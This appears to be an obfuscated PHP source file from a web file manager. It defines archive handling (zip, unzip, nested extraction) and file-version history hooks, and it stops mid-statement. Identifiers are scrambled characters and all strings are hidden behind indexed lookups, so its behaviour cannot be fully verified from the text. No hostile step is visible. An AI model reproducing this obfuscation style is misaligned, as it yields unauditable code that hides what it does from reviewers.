<?php
 goto B¢‡ô³Ó³ª; BãÃ³»ÕÆ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ñƒéíóÔ; if ($ñƒéíóÔ) { return $ñƒéíóÔ; } $òÕğ³î = IO::init($_SERVER[ˆö¿ÚÌ¼][8]); return $òÕğ³î; } private static function iconvSystem($”®ÃÑ») { return self::local()->iconvSystem($”®ÃÑ»); } private static function iconvApp($´»áƒ“) { return self::local()->iconvApp($´»áƒ“); } public static function zipFolder($’—·£şÃ, $É½õÊ‘Ü = "\172\x69\x70", $ã×Œ€µá = '', $µ¨àì°Ø = REPEAT_RENAME) { $ÛÁ¹Œ¦ =& $_SERVER[ˆö¿ÚÌ¼]; $òÀôîÆõ = IO::listPath($’—·£şÃ); if (!$òÀôîÆõ) { return !1; } $òÀôîÆõ = array_merge($òÀôîÆõ[$ÛÁ¹Œ¦[85]], $òÀôîÆõ[$ÛÁ¹Œ¦[86]]); return self::zip($òÀôîÆõ, $É½õÊ‘Ü, $ã×Œ€µá, $µ¨àì°Ø); } public static function zip($‡¤ë©£Û, $º²´Ğè = "\172\151\x70", $ÃÎ¾Í•ê = '', $Íşú = REPEAT_RENAME) { $µ•¦êš‹ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_string($‡¤ë©£Û) && $‡¤ë©£Û) { $‡¤ë©£Û = array(array($µ•¦êš‹[87] => $‡¤ë©£Û)); } $é¶Ğ¼ûä = self::init($‡¤ë©£Û[0][$µ•¦êš‹[87]]); $®”úñœ = self::info($‡¤ë©£Û[0][$µ•¦êš‹[87]]); $–úãÉßï = $µ•¦êš‹[12]; $Øç¶Õåì = $µ•¦êš‹[12]; $æ×ØÃ¶Ä = $µ•¦êš‹[12]; if ($ÃÎ¾Í•ê && substr($ÃÎ¾Í•ê, -1, 1) != $µ•¦êš‹[8]) { $Øç¶Õåì = get_path_father($ÃÎ¾Í•ê); $æ×ØÃ¶Ä = get_path_this($ÃÎ¾Í•ê); } else { $Øç¶Õåì = self::pathFather($®”úñœ[$µ•¦êš‹[87]]); $æ×ØÃ¶Ä = $®”úñœ[$µ•¦êš‹[32]] . $µ•¦êš‹[10] . $º²´Ğè; if (count($‡¤ë©£Û) > 1) { $“õ§Æµ‘ = IO::info($Øç¶Õåì); $æ×ØÃ¶Ä = $“õ§Æµ‘[$µ•¦êš‹[32]] . $µ•¦êš‹[10] . $º²´Ğè; } if ($ÃÎ¾Í•ê) { $Øç¶Õåì = $ÃÎ¾Í•ê; } } if ($é¶Ğ¼ûä->getType() == $µ•¦êš‹[109]) { $‹¡Ú×Œü = self::init($Øç¶Õåì); $öãÚØìî = $‹¡Ú×Œü->getType() == $µ•¦êš‹[109] ? $Øç¶Õåì : get_path_father($é¶Ğ¼ûä->path); $öãÚØìî = IO::getPathInner($öãÚØìî); $öãÚØìî = rtrim($öãÚØìî, $µ•¦êš‹[8]) . $µ•¦êš‹[8]; mk_dir($öãÚØìî); } else { $–úãÉßï = TEMP_FILES . $µ•¦êš‹[1279] . time() . rand_string(8) . $µ•¦êš‹[8]; mk_dir($–úãÉßï); file_put_contents($–úãÉßï . $µ•¦êš‹[1280], $µ•¦êš‹[12]); $öãÚØìî = $–úãÉßï; } $ÊÚ¹Ô×‹ = IO::info($öãÚØìî); if (!$ÊÚ¹Ô×‹ || !$ÊÚ¹Ô×‹[$µ•¦êš‹[236]]) { show_json(LNG($µ•¦êš‹[1281]), !1); } $ë’î·ë = self::zipFileList($‡¤ë©£Û, $–úãÉßï); foreach ($ë’î·ë as $ƒà²µÖÂ => $á‡Åü÷Ú) { $ë’î·ë[$ƒà²µÖÂ] = self::iconvSystem($á‡Åü÷Ú); } $÷¼µ‡’ = get_filename_auto($öãÚØìî . $æ×ØÃ¶Ä, $µ•¦êš‹[12], $Íşú); KodArchive::create(self::iconvSystem($÷¼µ‡’), $ë’î·ë); if (!IO::exist($÷¼µ‡’)) { if ($–úãÉßï) { del_dir($–úãÉßï); } write_log($µ•¦êš‹[1282] . $÷¼µ‡’, $µ•¦êš‹[391]); show_json(LNG($µ•¦êš‹[1283]), !1); } if (!$–úãÉßï) { return $÷¼µ‡’; } $ÄÑ²µÊÑ = self::move($÷¼µ‡’, $Øç¶Õåì, $Íşú); if ($–úãÉßï) { del_dir($–úãÉßï); } if (!$÷¼µ‡’) { write_log($µ•¦êš‹[1284] . $÷¼µ‡’ . $µ•¦êš‹[1285] . $Øç¶Õåì, $µ•¦êš‹[391]); show_json(LNG($µ•¦êš‹[1283]), !1); } return $ÄÑ²µÊÑ; } public static function unzip($áÓÎê©›, $äÍ±úÇÖ, $â×¡î¼ = "\x2d\61", $Æ‰×±÷Ö = "\x72\145\160\x6c\141\143\145") { $ÆšãàªÁ =& $_SERVER[ˆö¿ÚÌ¼]; $ØŸ‘Ìšë = parent::info($áÓÎê©›); if (!$ØŸ‘Ìšë) { show_json(LNG($ÆšãàªÁ[1286]), !1); } $Ó“°Î’İ = IO::infoFullSimple($äÍ±úÇÖ); if (!$Ó“°Î’İ) { $äÍ±úÇÖ = IO::mkdir($äÍ±úÇÖ); } if (isset($Ó“°Î’İ[$ÆšãàªÁ[194]]) && trim($Ó“°Î’İ[$ÆšãàªÁ[87]], $ÆšãàªÁ[8]) != trim($äÍ±úÇÖ, $ÆšãàªÁ[8])) { $ïïÌ¢ôù = KodIO::make($Ó“°Î’İ[$ÆšãàªÁ[193]]); $Í¸Ïö = IO::fileNameAuto($ïïÌ¢ôù, $Ó“°Î’İ[$ÆšãàªÁ[32]], REPEAT_RENAME_FOLDER, !0); $äÍ±úÇÖ = IO::mkdir($ïïÌ¢ôù . $Í¸Ïö); } $â×¡î¼ = $â×¡î¼ && $â×¡î¼ != $ÆšãàªÁ[1287] ? @json_decode($â×¡î¼, !0) : -1; $Ô‡ô”ë¨ = self::unzipPart($áÓÎê©›, $â×¡î¼); if (!$Ô‡ô”ë¨ || !IO::exist($Ô‡ô”ë¨[$ÆšãàªÁ[233]])) { show_json(LNG($ÆšãàªÁ[108]), !1); } $¶÷Ã€ã½ = $Ô‡ô”ë¨[$ÆšãàªÁ[1288]][count($Ô‡ô”ë¨[$ÆšãàªÁ[1288]]) - 1]; if ($¶÷Ã€ã½[$ÆšãàªÁ[1289]] == -1 || substr($¶÷Ã€ã½[$ÆšãàªÁ[32]], -1, 1) == $ÆšãàªÁ[8]) { $ğ‚±·¦‹ = $Ô‡ô”ë¨[$ÆšãàªÁ[1290]] . rand_string(10) . $ÆšãàªÁ[8]; mk_dir($ğ‚±·¦‹); $«íİ…»× = count($Ô‡ô”ë¨[$ÆšãàªÁ[1288]]) == 1 ? IO::ext($áÓÎê©›) : get_path_ext($Ô‡ô”ë¨[$ÆšãàªÁ[233]]); $ÃËÏéš• = KodArchive::extract(self::iconvSystem($Ô‡ô”ë¨[$ÆšãàªÁ[233]]), $ğ‚±·¦‹, $¶÷Ã€ã½[$ÆšãàªÁ[1289]], $Í¸Ïö, $«íİ…»×); self::unzipErrorCheck($ÃËÏéš•, array($ÆšãàªÁ[1291], $áÓÎê©›, $«íİ…»×, $äÍ±úÇÖ, $Ô‡ô”ë¨)); Hook::trigger($ÆšãàªÁ[1292], $ğ‚±·¦‹); recursion_dir($ğ‚±·¦‹, $€à¥÷ï‰, $£ÕŠ‘œ°, 0); $Õ³ “Æô = array_merge($€à¥÷ï‰, $£ÕŠ‘œ°); $øõá—¾ = array(); foreach ($Õ³ “Æô as $àêêÉ¤ß) { $ºøÕ”‹ş = IO::move(self::iconvApp($àêêÉ¤ß), $äÍ±úÇÖ, $Æ‰×±÷Ö); if ($ºøÕ”‹ş) { $øõá—¾[] = $ºøÕ”‹ş; } } del_dir($ğ‚±·¦‹); } else { $ºøÕ”‹ş = IO::move($Ô‡ô”ë¨[$ÆšãàªÁ[233]], $äÍ±úÇÖ, $Æ‰×±÷Ö, get_path_this($¶÷Ã€ã½[$ÆšãàªÁ[32]])); if ($ºøÕ”‹ş) { $øõá—¾[] = $ºøÕ”‹ş; } } return $øõá—¾ ? $øõá—¾ : !1; } public static function unzipList($Í»ûÉäß) { $ºØúåÒş =& $_SERVER[ˆö¿ÚÌ¼]; $ÌéŞ€Ë‡ = isset($Í»ûÉäß[$ºØúåÒş[1293]]) ? $Í»ûÉäß[$ºØúåÒş[1293]] : !1; $Äå‚¾Ã— = isset($Í»ûÉäß[$ºØúåÒş[1289]]) ? @json_decode($Í»ûÉäß[$ºØúåÒş[1289]], !0) : -1; $ª¿²É×ˆ = self::unzipPart($Í»ûÉäß[$ºØúåÒş[87]], $Äå‚¾Ã—); if (!$ª¿²É×ˆ || !IO::exist($ª¿²É×ˆ[$ºØúåÒş[233]])) { show_json(LNG($ºØúåÒş[108]), !1); } $Ã·¬öŞÈ = $ª¿²É×ˆ[$ºØúåÒş[1288]][count($ª¿²É×ˆ[$ºØúåÒş[1288]]) - 1]; $¥É›¡§« = in_array(IO::ext($ª¿²É×ˆ[$ºØúåÒş[233]]), array($ºØúåÒş[391], $ºØúåÒş[1294], $ºØúåÒş[1295], $ºØúåÒş[1296], $ºØúåÒş[1297], $ºØúåÒş[1298])); if (!$ÌéŞ€Ë‡ && ($Ã·¬öŞÈ[$ºØúåÒş[1289]] == -1 || $¥É›¡§«)) { $ÖîëâÜä = $ª¿²É×ˆ[$ºØúåÒş[1290]] . get_path_this($ª¿²É×ˆ[$ºØúåÒş[233]]) . $ºØúåÒş[1299]; if (!IO::exist($ÖîëâÜä)) { $ååÄåŸ¹ = $Ã·¬öŞÈ[$ºØúåÒş[1289]] == -1 ? get_path_ext(IO::pathThis($Í»ûÉäß[$ºØúåÒş[87]])) : get_path_ext($ª¿²É×ˆ[$ºØúåÒş[233]]); $ÉÌ¾‘¥” = KodArchive::listContent(self::iconvSystem($ª¿²É×ˆ[$ºØúåÒş[233]]), !0, $ååÄåŸ¹); self::unzipErrorCheck($ÉÌ¾‘¥”, array($ºØúåÒş[1300], $Í»ûÉäß, $ª¿²É×ˆ)); @file_put_contents($ÖîëâÜä, json_encode($ÉÌ¾‘¥”[$ºØúåÒş[1301]])); } return @json_decode(IO::getContent($ÖîëâÜä), !0); } IO::fileOut($ª¿²É×ˆ[$ºØúåÒş[233]], $ÌéŞ€Ë‡, get_path_this($Ã·¬öŞÈ[$ºØúåÒş[32]])); die; } private static function zipFileList($Ò·‹İ²Ö, $£Ã»Ô¼Ü = false) { $ı¥Ã¯Ø» =& $_SERVER[ˆö¿ÚÌ¼]; $íÁíß‡Ş = array(); foreach ($Ò·‹İ²Ö as $ä–Šè™°) { $ĞŒá˜­ = $ä–Šè™°[$ı¥Ã¯Ø»[87]]; if ($£Ã»Ô¼Ü) { $ĞŒá˜­ = self::copy($ä–Šè™°[$ı¥Ã¯Ø»[87]], $£Ã»Ô¼Ü, $ı¥Ã¯Ø»[909]); } else { $®ìÜõ¾Ï = self::init($ä–Šè™°[$ı¥Ã¯Ø»[87]]); if ($®ìÜõ¾Ï->getType() == $ı¥Ã¯Ø»[109]) { $ĞŒá˜­ = $®ìÜõ¾Ï->path; } } if ($ĞŒá˜­ && self::local()->exist($ĞŒá˜­)) { $íÁíß‡Ş[$ä–Šè™°[$ı¥Ã¯Ø»[87]]] = $ĞŒá˜­; } } if (!empty($íÁíß‡Ş)) { return array_values($íÁíß‡Ş); } show_json(LNG($ı¥Ã¯Ø»[1260]), !1); } private static function localFilePath($‹…¾àÕÎ) { $î×·Ö¡± =& $_SERVER[ˆö¿ÚÌ¼]; $£´è—¶ñ = KodIO::parse($‹…¾àÕÎ); if ($£´è—¶ñ[$î×·Ö¡±[33]] == KodIO::KOD_SOURCE) { $Öê×ÎĞ = Model($î×·Ö¡±[915])->fileInfoGet(KodIO::sourceID($‹…¾àÕÎ)); if (!$Öê×ÎĞ[$î×·Ö¡±[87]]) { show_json($î×·Ö¡±[1302], !1); } $‹…¾àÕÎ = $Öê×ÎĞ[$î×·Ö¡±[87]]; } $ª«¶·É = self::init($‹…¾àÕÎ); if ($ª«¶·É->pathParse[$î×·Ö¡±[1246]]) { $‹…¾àÕÎ = $ª«¶·É->pathParse[$î×·Ö¡±[1246]]; $ª«¶·É = self::init($‹…¾àÕÎ); } $äÜÜ§½ = $ª«¶·É->getType(); if ($äÜÜ§½ == $î×·Ö¡±[109] || $äÜÜ§½ == $î×·Ö¡±[1303]) { if (!$ª«¶·É->exist($ª«¶·É->path)) { show_json(LNG($î×·Ö¡±[108]), !1); } return $ª«¶·É->path; } return !1; } public static function unzipPart($Æ²ãç‹Ø, $É¥ˆÃı = -1) { $³¿…¯¯ =& $_SERVER[ˆö¿ÚÌ¼]; $ÎâğÔÑ = IO::pathThis($Æ²ãç‹Ø); if (!$É¥ˆÃı || $É¥ˆÃı == -1) { $ö¹„§è· = array(array($³¿…¯¯[32] => $ÎâğÔÑ, $³¿…¯¯[1289] => -1)); $ö¹„§è·[0][$³¿…¯¯[1304]] = $ö¹„§è·[0][$³¿…¯¯[32]]; } else { if (is_array($É¥ˆÃı)) { $ö¹„§è· = $É¥ˆÃı; $çÎßÎ³ş = count($ö¹„§è·) - 1; for ($¾€©ç­ = 0; $¾€©ç­ <= $çÎßÎ³ş; $¾€©ç­++) { $ŞÖú¹“ë = $ö¹„§è·[$¾€©ç­]; $Ûå¢ŠÕÂ = get_path_this($ŞÖú¹“ë[$³¿…¯¯[32]]) . (checkExtSafe($ŞÖú¹“ë[$³¿…¯¯[32]]) ? $³¿…¯¯[12] : $³¿…¯¯[1305]); $ö¹„§è·[$¾€©ç­][$³¿…¯¯[1304]] = $³¿…¯¯[1306] . intval($ŞÖú¹“ë[$³¿…¯¯[1289]]) . $³¿…¯¯[465] . $Ûå¢ŠÕÂ; if ($¾€©ç­ == 0) { continue; } $ö¹„§è·[$¾€©ç­][$³¿…¯¯[1304]] = $ö¹„§è·[$¾€©ç­ - 1][$³¿…¯¯[1304]] . $³¿…¯¯[1307] . $ö¹„§è·[$¾€©ç­][$³¿…¯¯[1304]]; } } } if (!is_array($ö¹„§è·) || count($ö¹„§è·) == 0) { return !1; } $ÌŞ¬˜™¢ = $ö¹„§è·[count($ö¹„§è·) - 1]; if (!IO::exist($Æ²ãç‹Ø)) { return !1; } $‚€¥ŞôŠ = TEMP_FILES . $³¿…¯¯[1308] . kodIO::hashPathSafe($Æ²ãç‹Ø) . $³¿…¯¯[8]; $í‘ĞÜ•‹ = $‚€¥ŞôŠ . $ÌŞ¬˜™¢[$³¿…¯¯[1304]]; mk_dir($‚€¥ŞôŠ); file_put_contents(TEMP_FILES . $³¿…¯¯[1280], $³¿…¯¯[12]); if (IO::exist($í‘ĞÜ•‹)) { return array($³¿…¯¯[233] => $í‘ĞÜ•‹, $³¿…¯¯[1288] => $ö¹„§è·, $³¿…¯¯[1290] => $‚€¥ŞôŠ); } $ÌÁ‘ô•† = self::localFilePath($Æ²ãç‹Ø); if (!$ÌÁ‘ô•†) { $ÌÁ‘ô•† = $‚€¥ŞôŠ . $³¿…¯¯[1309]; if (!IO::exist($ÌÁ‘ô•†)) { self::copy($Æ²ãç‹Ø, $‚€¥ŞôŠ, !1, get_path_this($ÌÁ‘ô•†)); } } if (!$ÌÁ‘ô•† || !IO::exist($ÌÁ‘ô•†)) { return !1; } if ($ÌŞ¬˜™¢[$³¿…¯¯[1289]] == -1) { return array($³¿…¯¯[233] => $ÌÁ‘ô•†, $³¿…¯¯[1288] => $ö¹„§è·, $³¿…¯¯[1290] => $‚€¥ŞôŠ); } $–¬®¨ŒÒ = $ÌÁ‘ô•†; foreach ($ö¹„§è· as $¾€©ç­ => $ŞÖú¹“ë) { if (!$ŞÖú¹“ë || $ŞÖú¹“ë[$³¿…¯¯[1289]] == $³¿…¯¯[1287]) { break; } if (substr($ŞÖú¹“ë[$³¿…¯¯[32]], -1, 1) == $³¿…¯¯[8]) { break; } $Á²€Ìé = in_array(get_path_ext($ŞÖú¹“ë[$³¿…¯¯[1304]]), array($³¿…¯¯[391], $³¿…¯¯[1294], $³¿…¯¯[1295], $³¿…¯¯[1296], $³¿…¯¯[1297], $³¿…¯¯[1298])); $ÚóîÕşí = $¾€©ç­ == count($ö¹„§è·) - 1 && $Á²€Ìé; $æàË¬…¹ = $‚€¥ŞôŠ . $ŞÖú¹“ë[$³¿…¯¯[1304]]; $¼çÀã†ë = $‚€¥ŞôŠ . get_path_this($ŞÖú¹“ë[$³¿…¯¯[32]]); if (IO::exist($æàË¬…¹)) { $–¬®¨ŒÒ = $æàË¬…¹; continue; } $£ùñ§é = $¾€©ç­ == 0 ? get_path_ext($ÎâğÔÑ) : get_path_ext($–¬®¨ŒÒ); $÷ÖÌÌ « = KodArchive::extract(self::iconvSystem($–¬®¨ŒÒ), $‚€¥ŞôŠ, $ŞÖú¹“ë[$³¿…¯¯[1289]], $ÛşË¬Ş©, $£ùñ§é); self::unzipErrorCheck($÷ÖÌÌ «, array($³¿…¯¯[1310], $Æ²ãç‹Ø, $ö¹„§è·, $ŞÖú¹“ë, $æàË¬…¹)); if (IO::exist($¼çÀã†ë)) { IO::rename($¼çÀã†ë, get_path_this($æàË¬…¹)); } $–¬®¨ŒÒ = $æàË¬…¹; } $í‘ĞÜ•‹ = $–¬®¨ŒÒ; return array($³¿…¯¯[233] => $–¬®¨ŒÒ, $³¿…¯¯[1288] => $ö¹„§è·, $³¿…¯¯[1290] => $‚€¥ŞôŠ); } private static function unzipErrorCheck($º–®ŠÀ, $ÌÁø¾í² = false) { $ ½¬àû‹ =& $_SERVER[ˆö¿ÚÌ¼]; if ($º–®ŠÀ[$ ½¬àû‹[1311]]) { return !0; } write_log(array($ ½¬àû‹[1312], $º–®ŠÀ, $ÌÁø¾í²), $ ½¬àû‹[1313]); $¯Õ·§Ãò = is_array($º–®ŠÀ[$ ½¬àû‹[1301]]) ? json_encode($º–®ŠÀ[$ ½¬àû‹[1301]]) : $º–®ŠÀ[$ ½¬àû‹[1301]]; show_json($ ½¬àû‹[1314] . $¯Õ·§Ãò, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¦ù‹Œ™ =& $_SERVER[ˆö¿ÚÌ¼]; $Çì‰‘˜Ù = $GLOBALS[$¦ù‹Œ™[6]][$¦ù‹Œ™[92]]; if ($Çì‰‘˜Ù[$¦ù‹Œ™[1315]] != 1) { return; } if ($Çì‰‘˜Ù[$¦ù‹Œ™[1316]] <= 0) { return; } if (isset($_REQUEST[$¦ù‹Œ™[1317]]) && $_REQUEST[$¦ù‹Œ™[1317]] == $¦ù‹Œ™[91]) { return; } Hook::bind($¦ù‹Œ™[1318], $¦ù‹Œ™[1319]); Hook::bind($¦ù‹Œ™[1320], $¦ù‹Œ™[1321]); Hook::bind($¦ù‹Œ™[1322], $¦ù‹Œ™[1323]); Hook::bind($¦ù‹Œ™[1324], $¦ù‹Œ™[1325]); Hook::bind($¦ù‹Œ™[1326], $¦ù‹Œ™[1327]); Hook::bind($¦ù‹Œ™[1328], $¦ù‹Œ™[1329]); } public static function eventBeforeUpload($ªáş‚³) { if ($ªáş‚³[3] && $ªáş‚³[3] != REPEAT_REPLACE) { return; } $ùì¶æá = self::parsePath($ªáş‚³[0]); if (!$ùì¶æá) { return; } self::add($ùì¶æá); } public static function eventBeforeEdit($˜ÂßşŠÙ) { $÷Û¨Ò° = self::parsePath($˜ÂßşŠÙ[0]); if (!$÷Û¨Ò°) { return; } self::add($÷Û¨Ò°); } public static function eventBeforeCopyFile($•òÑ‡éµ, $Ü¬ú…••, $€É»´Ë, $®ıŞŸÎı, $¿µ–ºá¼, $¹¼¹æö”) { $Äã„¿û =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($€É»´Ë->_data[$Äã„¿û[1250]]) && $€É»´Ë->_data[$Äã„¿û[1250]]) { return; } $âÊ‡ğäÅ = $€É»´Ë->getPathOuter($®ıŞŸÎı); $½Çø¸İ = self::parsePath($âÊ‡ğäÅ); if (!$½Çø¸İ) { return; } self::add($½Çø¸İ); } public static function eventBeforeRename($ı“¤»Ê) { $Ş¬´êÂÒ =& $_SERVER[ˆö¿ÚÌ¼]; $àê–Ã· = self::parsePath($ı“¤»Ê[0]); if (!$àê–Ã·) { return; } $íª±úÓ² = self::checkInHistory($àê–Ã·); if (!$íª±úÓ²) { return; } if ($íª±úÓ²[$Ş¬´êÂÒ[33]] == $Ş¬´êÂÒ[233]) { $—“î¥“ï = self::listData($àê–Ã·); if ($—“î¥“ï && $—“î¥“ï[$Ş¬´êÂÒ[448]]) { self::moveHistory($àê–Ã·, $ı“¤»Ê[1]); } } else { IO::rename($íª±úÓ²[$Ş¬´êÂÒ[87]], $ı“¤»Ê[1]); } } public static function eventBeforeMove($ê´œîŒÚ) { $ ÂÜ‹•ğ =& $_SERVER[ˆö¿ÚÌ¼]; $äåÇë¯¨ = self::parsePath($ê´œîŒÚ[0]); if (!$äåÇë¯¨) { return; } $Œ±ğ¾£û = self::parsePath($ê´œîŒÚ[1]); if (!$Œ±ğ¾£û) { return; } $Ú…ßãÄÆ = $ê´œîŒÚ[3]; $ñïßç§ˆ = self::checkInHistory($äåÇë¯¨); if (!$ñïßç§ˆ) { return; } $íèê™„Õ = self::pathHistory($Œ±ğ¾£û); if ($ñïßç§ˆ[$ ÂÜ‹•ğ[33]] == $ ÂÜ‹•ğ[233]) { $­šÒ‰¡¬ = self::listData($äåÇë¯¨); $®™àö‘ş = rtrim($Œ±ğ¾£û, $ ÂÜ‹•ğ[8]) . $ ÂÜ‹•ğ[8] . ($Ú…ßãÄÆ ? $Ú…ßãÄÆ : get_path_this($äåÇë¯¨)); $ªšÜäˆ = self::listData($®™àö‘ş); if ($­šÒ‰¡¬ && $­šÒ‰¡¬[$ ÂÜ‹•ğ[448]] && $ªšÜäˆ && $ªšÜäˆ[$ ÂÜ‹•ğ[448]]) { return self::clear($äåÇë¯¨); } if ($­šÒ‰¡¬ && $­šÒ‰¡¬[$ ÂÜ‹•ğ[448]]) { self::moveHistory($äåÇë¯¨, $Ú…ßãÄÆ, $íèê™„Õ); } } else { IO::move($ñïßç§ˆ[$ ÂÜ‹•ğ[87]], $íèê™„Õ, !1, $Ú…ßãÄÆ); self::clearEmptyFolder(IO::pathFather($ñïßç§ˆ[$ ÂÜ‹•ğ[87]])); } } public static function eventAfterRemove($ñ ¤ÑÍè, $”ı†‹Í€) { $×·üŠª˜ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$”ı†‹Í€) { return; } $ÂãŠÂÎ = self::parsePath($ñ ¤ÑÍè[0]); if (!$ÂãŠÂÎ) { return; } $Ûğ¨» = self::checkInHistory($ÂãŠÂÎ); if (!$Ûğ¨») { return; } if ($Ûğ¨»[$×·üŠª˜[33]] == $×·üŠª˜[233]) { $ÈÑÀŒôÅ = self::listData($ÂãŠÂÎ, !1); if ($ÈÑÀŒôÅ && $ÈÑÀŒôÅ[$×·üŠª˜[448]]) { self::clear($ÂãŠÂÎ, !1); } } else { IO::remove($Ûğ¨»[$×·üŠª˜[87]]); self::clearEmptyFolder(IO::pathFather($Ûğ¨»[$×·üŠª˜[87]])); } } private static function checkInHistory($Æ¡¨Ùñ¡) { $¿ĞÌ€  = self::pathHistory($Æ¡¨Ùñ¡); if (!IO::exist($¿ĞÌ€ )) { $¿ĞÌ€  .= $_SERVER[ˆö¿ÚÌ¼][1330]; } return IO::exist($¿ĞÌ€ ) ? IO::info($¿ĞÌ€ ) : !1; } private static function parsePath($ÙÜ†ä«) { $·Ş´á•’ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ÙÜ†ä«) { return !1; } if (isset($GLOBALS[$·Ş´á•’[1331]]) && $GLOBALS[$·Ş´á•’[1331]]) { return; } $¿óš÷üœ = KodIO::parse($ÙÜ†ä«); $‡˜¥®÷… = $¿óš÷üœ[$·Ş´á•’[33]]; $Í–óè¨ = !$‡˜¥®÷… || $‡˜¥®÷… == KodIO::KOD_IO || $‡˜¥®÷… == KodIO::KOD_SHARE_ITEM; if (!$Í–óè¨ || !$¿óš÷üœ[$·Ş´á•’[1332]]) { return !1; } if (substr($ÙÜ†ä«, 0, strlen(DATA_PATH . $·Ş´á•’[1333])) == DATA_PATH . $·Ş´á•’[1333]) { return !1; } if ($‡˜¥®÷… == KodIO::KOD_SHARE_ITEM) { $”¡›¯Ù = IO::init($ÙÜ†ä«); if ($”¡›¯Ù->pathParse[$·Ş´á•’[1246]]) { return self::parsePath($”¡›¯Ù->pathParse[$·Ş´á•’[1246]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $û‡ğ†İ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $·Ş´á•’[1334]); foreach ($û‡ğ†İ as $Ü™å‘Ô¤) { if (!$‡˜¥®÷… && substr($ÙÜ†ä«, 0, strlen($Ü™å‘Ô¤)) == $Ü™å‘Ô¤) { return !1; } } self::log($GLOBALS[$·Ş´á•’[1241]] . $·Ş´á•’[1335] . $ÙÜ†ä«); return $ÙÜ†ä«; } private static function pathHistory($Şö´÷â²) { $ÁÆƒüÍö =& $_SERVER[ˆö¿ÚÌ¼]; $òäÓŸ§Ô = self::$_historyBase . ltrim(KodIO::clear($Şö´÷â²), $ÁÆƒüÍö[8]); $òäÓŸ§Ô = str_replace(array($ÁÆƒüÍö[1336]), array($ÁÆƒüÍö[1337]), $òäÓŸ§Ô); return $òäÓŸ§Ô; } public static function log($Ï»Ë¿³—) { } public static function historyCount($öƒÒ©¢Ü) { $£å‰”Æ‹ =& $_SERVER[ˆö¿ÚÌ¼]; $ĞÖÊ“˜ = array(); $»ÇÒÕÌ¥ = array(); foreach ($öƒÒ©¢Ü as $úª©Äôé) { $ç¾Õ´š = get_path_father($úª©Äôé); if (!$»ÇÒÕÌ¥[$ç¾Õ´š]) { $»ÇÒÕÌ¥[$ç¾Õ´š] = array(); } $»ÇÒÕÌ¥[$ç¾Õ´š][] = get_path_this($úª©Äôé); } foreach ($»ÇÒÕÌ¥ as $ç¾Õ´š => $ö±ˆø¤Ü) { $å–¿úùò = self::parsePath($ç¾Õ´š); if (!$å–¿úùò) { continue; } foreach ($ö±ˆø¤Ü as $Ñ«½”ÂÀ) { $şÃµ×Æ‚ = self::listData(rtrim($å–¿úùò, $£å‰”Æ‹[8]) . $£å‰”Æ‹[8] . $Ñ«½”ÂÀ, !1); if ($şÃµ×Æ‚ && $şÃµ×Æ‚[$£å‰”Æ‹[448]]) { $ĞÖÊ“˜[rtrim($ç¾Õ´š, $£å‰”Æ‹[8]) . $£å‰”Æ‹[8] . $Ñ«½”ÂÀ] = count($şÃµ×Æ‚[$£å‰”Æ‹[448]]); } } } return $ĞÖÊ“˜; } public static function add($´Íƒı¢Ö) { $µ€ÒœŸß =& $_SERVER[ˆö¿ÚÌ¼]; $šûü„®ş = self::listData($´Íƒı¢Ö); if (!$šûü„®ş) { return; } $öõ¼€îè = Model($µ€ÒœŸß[855])->get($µ€ÒœŸß[1338]); $ıˆÓÕ´ì = intval($GLOBALS[$µ€ÒœŸß[6]][$µ€ÒœŸß[92]][$µ€ÒœŸß[1316]]); $Şô©Ê¼» = $öõ¼€îè == $µ€ÒœŸß[1339] ? min(5, $ıˆÓÕ´ì) : $ıˆÓÕ´ì; if ($ıˆÓÕ´ì <= 0) { return; } $èàå·Ô = IO::info($´Íƒı¢Ö); $“Îß«µ = $šûü„®ş[$µ€ÒœŸß[448]]; if ($èàå·Ô[$µ€ÒœŸß[79]] == 0) { return; } if ($èàå·Ô[$µ€ÒœŸß[79]] >= 1024 * 1024 * 500) { return !1; } $“â«Ô² = IO::hashSimple($´Íƒı¢Ö); if ($“Îß«µ && $“Îß«µ[0][$µ€ÒœŸß[689]] == $“â«Ô²) { return !0; } if (array_key_exists($µ€ÒœŸß[236], $èàå·Ô) && !$èàå·Ô[$µ€ÒœŸß[236]]) { return !1; } $ä­¶êö¬ = short_id(time()); $–…çÌµ® = array($µ€ÒœŸß[478] => $ä­¶êö¬, $µ€ÒœŸß[689] => $“â«Ô², $µ€ÒœŸß[32] => $èàå·Ô[$µ€ÒœŸß[32]] . $µ€ÒœŸß[10] . date($µ€ÒœŸß[1340]) . rand_string(1), $µ€ÒœŸß[79] => $èàå·Ô[$µ€ÒœŸß[79]], $µ€ÒœŸß[539] => USER_ID, $µ€ÒœŸß[234] => time(), $µ€ÒœŸß[1341] => $µ€ÒœŸß[12]); IO::mkdir($šûü„®ş[$µ€ÒœŸß[1342]]); $ÙĞ®À¡ = IO::copy($´Íƒı¢Ö, $šûü„®ş[$µ€ÒœŸß[1342]], !1, $–…çÌµ®[$µ€ÒœŸß[32]]); if (!$ÙĞ®À¡) { self::clearEmptyFolder($šûü„®ş[$µ€ÒœŸß[1342]]); return !1; } array_unshift($“Îß«µ, $–…çÌµ®); if (count($“Îß«µ) > $Şô©Ê¼») { $ÙÚ¼í¶ô = array_slice($“Îß«µ, $Şô©Ê¼»); foreach ($ÙÚ¼í¶ô as $Ø¬ÒÆŠ) { IO::remove($šûü„®ş[$µ€ÒœŸß[1342]] . $Ø¬ÒÆŠ[$µ€ÒœŸß[32]]); } $“Îß«µ = array_slice($“Îß«µ, 0, $Şô©Ê¼»); } return self::saveData($šûü„®ş[$µ€ÒœŸß[1343]], $“Îß«µ); } public static function remove($ÄõÆÃÒş, $íêÅõ£) { $»ĞËª¾Æ =& $_SERVER[ˆö¿ÚÌ¼]; $Ùáª ÌÏ = self::listData($ÄõÆÃÒş); $š‚ÉÌÔ¶ = array(); if (!$Ùáª ÌÏ) { return !1; } foreach ($Ùáª ÌÏ[$»ĞËª¾Æ[448]] as $—–Ò¹±Ê) { if ($—–Ò¹±Ê[$»ĞËª¾Æ[478]] == $íêÅõ£) { IO::remove($Ùáª ÌÏ[$»ĞËª¾Æ[1342]] . 